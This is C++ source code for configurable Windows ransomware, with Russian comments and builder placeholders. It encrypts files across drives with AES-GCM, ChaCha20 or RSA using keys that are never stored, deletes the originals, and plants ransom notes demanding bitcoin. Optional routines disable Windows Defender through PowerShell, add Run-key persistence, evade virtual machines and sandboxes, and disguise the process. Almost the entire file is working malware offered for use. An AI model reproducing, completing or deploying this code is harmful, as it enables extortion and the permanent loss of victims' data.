#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <random>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <ctime>

// ============================================================
// ПОДКЛЮЧЕНИЕ OPENSSL
// ============================================================
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// ЗАГЛУШКИ — БУДУТ ЗАМЕНЕНЫ БИЛДЕРОМ
// ============================================================
#define ALGO_PLACEHOLDER 0
#define DRIVES_PLACEHOLDER "C:\\|D:\\"
#define FOLDERS_INCLUDE_PLACEHOLDER ""
#define FOLDERS_EXCLUDE_PLACEHOLDER "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)"
#define EXTS_PLACEHOLDER ".txt|.doc|.docx"
#define ENCRYPTED_EXT_PLACEHOLDER ".enc"
#define WALLPAPER_PLACEHOLDER ""
#define NOTE_NAME_PLACEHOLDER "READ_ME.txt"
#define NOTE_CONTENT_PLACEHOLDER "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com"
#define FAKE_PROCESS_NAME_PLACEHOLDER "svchost.exe"
#define FAKE_PROCESS_ENABLED_PLACEHOLDER 0
#define HIDE_PROCESS_ENABLED_PLACEHOLDER 0
#define ANTI_VM_ENABLED_PLACEHOLDER 0
#define DISABLE_DEFENDER_ENABLED_PLACEHOLDER 0
#define ADD_PERSISTENCE_ENABLED_PLACEHOLDER 0
#define HIDE_FILES_ENABLED_PLACEHOLDER 0
#define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0

// ============================================================
// РЕАЛЬНОЕ ШИФРОВАНИЕ AES-256-GCM (OpenSSL)
// ============================================================
class AES_GCM {
private:
    unsigned char key[32];
    unsigned char iv[12];
    
public:
    AES_GCM() {
        RAND_bytes(key, 32);
        RAND_bytes(iv, 12);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (input.empty()) return false;
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        output.resize(input.size() + 16 + 12);
        memcpy(output.data(), iv, 12);
        
        int outLen = 0;
        int totalLen = 0;
        
        if (EVP_EncryptUpdate(ctx, output.data() + 12, &outLen, input.data(), input.size()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        totalLen += outLen;
        
        if (EVP_EncryptFinal_ex(ctx, output.data() + 12 + totalLen, &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        totalLen += outLen;
        
        unsigned char tag[16];
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        memcpy(output.data() + 12 + totalLen, tag, 16);
        output.resize(12 + totalLen + 16);
        
        EVP_CIPHER_CTX_free(ctx);
        return true;
    }
};

// ============================================================
// РЕАЛЬНОЕ ШИФРОВАНИЕ ChaCha20 (OpenSSL)
// ============================================================
class ChaCha20 {
private:
    unsigned char key[32];
    unsigned char nonce[12];
    
public:
    ChaCha20() {
        RAND_bytes(key, 32);
        RAND_bytes(nonce, 12);
    }
    
    void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (input.empty()) return;
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return;
        
        if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, nonce) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return;
        }
        
        output.resize(input.size() + 12);
        memcpy(output.data(), nonce, 12);
        
        int outLen = 0;
        if (EVP_EncryptUpdate(ctx, output.data() + 12, &outLen, input.data(), input.size()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return;
        }
        
        output.resize(12 + outLen);
        EVP_CIPHER_CTX_free(ctx);
    }
};

// ============================================================
// РЕАЛЬНОЕ ШИФРОВАНИЕ RSA-2048 (OpenSSL)
// ============================================================
class RSA_Encrypt {
private:
    RSA* rsa;
    
public:
    RSA_Encrypt() : rsa(NULL) {
        rsa = RSA_generate_key(2048, RSA_F4, NULL, NULL);
        if (!rsa) return;
    }
    
    ~RSA_Encrypt() {
        if (rsa) RSA_free(rsa);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!rsa || input.empty()) return false;
        if (input.size() > 245) return false;
        
        output.resize(RSA_size(rsa));
        int encLen = RSA_public_encrypt(input.size(), input.data(), output.data(), rsa, RSA_PKCS1_OAEP_PADDING);
        if (encLen <= 0) return false;
        
        output.resize(encLen);
        return true;
    }
};

// ============================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================
std::vector<std::string> split_string(const std::string& str, char delimiter) {
    std::vector<std::string> result;
    std::stringstream ss(str);
    std::string item;
    while (std::getline(ss, item, delimiter)) {
        if (!item.empty()) result.push_back(item);
    }
    return result;
}

void set_wallpaper(const std::string& base64_data, const std::string& ext) {
    if (base64_data.empty()) return;
    
    DWORD size = 0;
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
    if (size == 0) return;
    
    std::vector<BYTE> data(size);
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
    
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    std::string wall_path = std::string(temp_path) + "wall" + ext;
    
    std::ofstream out(wall_path, std::ios::binary);
    out.write((char*)data.data(), data.size());
    out.close();
    
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void add_persistence() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }
}

void hide_files(const std::string& ext) {
    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    
    for (char* d = drives; *d; d += strlen(d) + 1) {
        std::string drive = d;
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_regular_file()) {
                    std::string path = entry.path().string();
                    if (path.length() >= ext.length() && path.substr(path.length() - ext.length()) == ext) {
                        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
                    }
                }
            }
        } catch (...) {}
    }
}

bool detect_vm() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                std::string name = pe.szExeFile;
                std::transform(name.begin(), name.end(), name.begin(), ::tolower);
                if (name.find("vbox") != std::string::npos ||
                    name.find("vmware") != std::string::npos ||
                    name.find("virtual") != std::string::npos ||
                    name.find("qemu") != std::string::npos) {
                    CloseHandle(snap);
                    return true;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return false;
}

void disable_defender() {
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
}

void fake_process_name() {
    SetConsoleTitleA(FAKE_PROCESS_NAME_PLACEHOLDER);
}

void hide_process() {
    try {
        SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
    } catch (...) {}
}

// ============================================================
// ШИФРОВАНИЕ ФАЙЛОВ
// ============================================================
void encrypt_file(const std::string& path, const std::string& ext, int algo) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
        in.close();
        
        if (data.empty()) return;
        
        std::vector<BYTE> encrypted;
        bool success = false;
        
        switch (algo) {
            case 0: {
                AES_GCM aes;
                success = aes.Encrypt(data, encrypted);
                break;
            }
            case 1: {
                ChaCha20 chacha;
                chacha.Encrypt(data, encrypted);
                success = true;
                break;
            }
            case 2: {
                RSA_Encrypt rsa;
                if (data.size() > 245) return;
                success = rsa.Encrypt(data, encrypted);
                break;
            }
            default: return;
        }
        
        if (!success || encrypted.empty()) return;
        
        std::string out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileA(path.c_str());
    } catch (...) {}
}

// ============================================================
// ОБХОД ПАПОК И ШИФРОВАНИЕ
// ============================================================
void walk_and_encrypt(const std::string& start_path,
                      const std::vector<std::string>& extensions,
                      const std::vector<std::string>& exclude_folders,
                      const std::string& encrypted_ext,
                      int algo) {
    try {
        for (auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {
            if (entry.is_directory()) continue;
            
            std::string full_path = entry.path().string();
            bool excluded = false;
            for (const auto& ex : exclude_folders) {
                if (full_path.find(ex) == 0) {
                    excluded = true;
                    break;
                }
            }
            if (excluded) continue;
            
            std::string ext = entry.path().extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                encrypt_file(full_path, encrypted_ext, algo);
            }
        }
    } catch (...) {}
}

// ============================================================
// СОЗДАНИЕ ФАЙЛОВ ВЫКУПА
// ============================================================
void drop_notes(const std::vector<std::string>& drives,
                const std::vector<std::string>& exclude_folders,
                const std::string& note_name,
                const std::string& note_content) {
    for (const auto& drive : drives) {
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_directory()) {
                    std::string note_path = entry.path().string() + "\\" + note_name;
                    
                    bool excluded = false;
                    for (const auto& ex : exclude_folders) {
                        if (entry.path().string().find(ex) == 0) {
                            excluded = true;
                            break;
                        }
                    }
                    if (excluded) continue;
                    
                    if (!std::filesystem::exists(note_path)) {
                        std::ofstream out(note_path);
                        out << note_content;
                        out.close();
                    }
                }
            }
        } catch (...) {}
    }
}

// ============================================================
// ГЛАВНАЯ ФУНКЦИЯ
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    srand(GetTickCount() ^ GetCurrentProcessId());
    
    if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) return 0;
    if (FAKE_PROCESS_ENABLED_PLACEHOLDER) fake_process_name();
    if (HIDE_PROCESS_ENABLED_PLACEHOLDER) hide_process();
    if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) disable_defender();
    if (ADD_PERSISTENCE_ENABLED_PLACEHOLDER) add_persistence();
    if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) Sleep(60000);
    
    std::string drives_str = DRIVES_PLACEHOLDER;
    std::string exts_str = EXTS_PLACEHOLDER;
    std::string exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
    std::string encrypted_ext = ENCRYPTED_EXT_PLACEHOLDER;
    
    auto drives = split_string(drives_str, '|');
    auto extensions = split_string(exts_str, '|');
    auto exclude_folders = split_string(exclude_str, '|');
    int algo = ALGO_PLACEHOLDER;
    
    std::vector<std::thread> threads;
    for (const auto& drive : drives) {
        threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
                           std::ref(exclude_folders), std::ref(encrypted_ext), algo);
    }
    for (auto& t : threads) t.join();
    
    if (HIDE_FILES_ENABLED_PLACEHOLDER) hide_files(encrypted_ext);
    
    std::string note_name = NOTE_NAME_PLACEHOLDER;
    std::string note_content = NOTE_CONTENT_PLACEHOLDER;
    drop_notes(drives, exclude_folders, note_name, note_content);
    
    set_wallpaper(WALLPAPER_PLACEHOLDER, ".jpg");
    
    return 0;
}
